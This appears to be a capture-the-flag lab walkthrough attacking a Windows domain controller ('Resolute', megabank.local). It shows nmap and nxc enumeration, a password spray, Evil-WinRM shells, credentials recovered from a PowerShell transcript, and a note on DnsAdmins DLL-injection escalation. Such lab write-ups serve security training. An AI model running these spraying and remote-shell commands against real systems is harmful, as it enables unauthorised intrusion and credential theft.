# Host file setup
```python
sudo nxc smb 10.129.96.155 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
```
- SMB signing enabled
- SMBv1
- Null auth enabled
- Vulnerable windows version to priv esc attacks like `noPac` and `ZeroLogon`

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT resolute.megabank.local                                                                 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 17:41 +0100
Nmap scan report for resolute.megabank.local (10.129.96.155)
Host is up (0.016s latency).
rDNS record for 10.129.96.155: RESOLUTE.megabank.local
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49686/tcp open  unknown
49710/tcp open  unknown
49845/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
```
## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT resolute.megabank.local            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 17:43 +0100
Nmap scan report for resolute.megabank.local (10.129.96.155)
Host is up (0.014s latency).
rDNS record for 10.129.96.155: RESOLUTE.megabank.local

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-15 16:50:34Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf       .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server 2016
Network Distance: 2 hops
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# System time
```python
ntpdate -q resolute.megabank.local
2026-04-15 18:05:28.243305 (+0100) +420.457817 +/- 0.008017 resolute.megabank.local 10.129.96.155 s1 no-lea
```
Found the time the DC is running at

# SMB (445) 
## Null authentication
### Users
```python
nxc smb resolute.megabank.local -u '' -p '' --users-export users.txt
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\: 
SMB         10.129.96.155   445    RESOLUTE         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.96.155   445    RESOLUTE         Administrator                 2026-04-15 16:50:03 0       Built-in account for administering the computer/domain 
SMB         10.129.96.155   445    RESOLUTE         Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.96.155   445    RESOLUTE         krbtgt                        2019-09-25 13:29:12 0       Key Distribution Center Service Account 
SMB         10.129.96.155   445    RESOLUTE         DefaultAccount                <never>             0       A user account managed by the system. 
SMB         10.129.96.155   445    RESOLUTE         ryan                          2026-04-15 16:52:03 0        
SMB         10.129.96.155   445    RESOLUTE         marko                         2019-09-27 13:17:14 0       Account created. Password set to Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         sunita                        2019-12-03 21:26:29 0        
SMB         10.129.96.155   445    RESOLUTE         abigail                       2019-12-03 21:27:30 0        
SMB         10.129.96.155   445    RESOLUTE         marcus                        2019-12-03 21:27:59 0        
SMB         10.129.96.155   445    RESOLUTE         sally                         2019-12-03 21:28:29 0        
SMB         10.129.96.155   445    RESOLUTE         fred                          2019-12-03 21:29:01 0        
SMB         10.129.96.155   445    RESOLUTE         angela                        2019-12-03 21:29:43 0        
SMB         10.129.96.155   445    RESOLUTE         felicia                       2019-12-03 21:30:53 0        
SMB         10.129.96.155   445    RESOLUTE         gustavo                       2019-12-03 21:31:42 0        
SMB         10.129.96.155   445    RESOLUTE         ulf                           2019-12-03 21:32:19 0        
SMB         10.129.96.155   445    RESOLUTE         stevie                        2019-12-03 21:33:13 0        
SMB         10.129.96.155   445    RESOLUTE         claire                        2019-12-03 21:33:44 0        
SMB         10.129.96.155   445    RESOLUTE         paulo                         2019-12-03 21:34:46 0        
SMB         10.129.96.155   445    RESOLUTE         steve                         2019-12-03 21:35:25 0        
SMB         10.129.96.155   445    RESOLUTE         annette                       2019-12-03 21:36:55 0        
SMB         10.129.96.155   445    RESOLUTE         annika                        2019-12-03 21:37:23 0        
SMB         10.129.96.155   445    RESOLUTE         per                           2019-12-03 21:38:12 0        
SMB         10.129.96.155   445    RESOLUTE         claude                        2019-12-03 21:39:56 0        
SMB         10.129.96.155   445    RESOLUTE         melanie                       2026-04-15 16:50:03 0        
SMB         10.129.96.155   445    RESOLUTE         zach                          2019-12-04 10:39:27 0        
SMB         10.129.96.155   445    RESOLUTE         simon                         2019-12-04 10:39:58 0        
SMB         10.129.96.155   445    RESOLUTE         naoki                         2019-12-04 10:40:44 0        
SMB         10.129.96.155   445    RESOLUTE         [*] Enumerated 27 local users: MEGABANK
SMB         10.129.96.155   445    RESOLUTE         [*] Writing 27 local users to users.txt
```
Managed to dump all users to a user list 

Also found a password `Welcome123!

Ill spray this against all the users

### Shares
```python
nxc smb resolute.megabank.local -u '' -p '' --shares                
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\: 
SMB         10.129.96.155   445    RESOLUTE         [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
Cannot enumerate shares using null authentication

Also worth noting that the guest account is disabled

# Compromising `melanie` via password spray

```python
nxc smb resolute.megabank.local -u users.txt -p 'Welcome123!' --continue-on-success                         
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE
```
`melanie` is compromised

This is why it is important to spray it against all users, even though the password was in `marko` account description it doesnt work on his account

## Access as `melanie`
```python
nxc smb resolute.megabank.local -u melanie -p 'Welcome123!' --shares              
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         [*] Enumerated shares
SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.96.155   445    RESOLUTE         -----           -----------     ------
SMB         10.129.96.155   445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.129.96.155   445    RESOLUTE         C$                              Default share
SMB         10.129.96.155   445    RESOLUTE         IPC$            READ            Remote IPC
SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share 
SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share
```
Default access on shares

Ive tried some kerberoasting now i have credentials and got nothing

```python
nxc winrm resolute.megabank.local -u melanie -p 'Welcome123!'                                                
WINRM       10.129.96.155   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```
I have access over WINRM as this user

## Shell as `melanie`
```python
evil-winrm -i resolute.megabank.local -u melanie -p 'Welcome123!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents>
```
Shell access as `melanie`

# Compromising `ryan`
```python
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


*Evil-WinRM* PS C:\PSTranscripts\20191203>
```
Found an interesting `.txt` file

```python
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```
Found some credentials

```python
ryan:Serv3r4Admin4cc123!
```
Ill validate these credentials

```python
nxc smb resolute.megabank.local -u ryan -p 'Serv3r4Admin4cc123!' 
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```
This user account is compromised and they are some form of admin looking at bloodhound he seems to be a tier zero account

He is also part of remote management users so i can get access over WINRM

## Shell as `ryan`
```python
evil-winrm -i resolute.megabank.local -u ryan -p 'Serv3r4Admin4cc123!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```
Shell access as `ryan`

Looking at bloodhound i can see that the user is part of the `DnsAdmins` group

> Members of the DnsAdmins group in Active Directory (AD) possess the ability to manage DNS servers, which often run directly on Domain Controllers (DCs) with NT AUTHORITY\SYSTEM privileges. Attackers who compromise a user account in this group can leverage this access to inject a malicious Dynamic Link Library (DLL) into the DNS service, resulting in privilege escalation to Domain Admin.



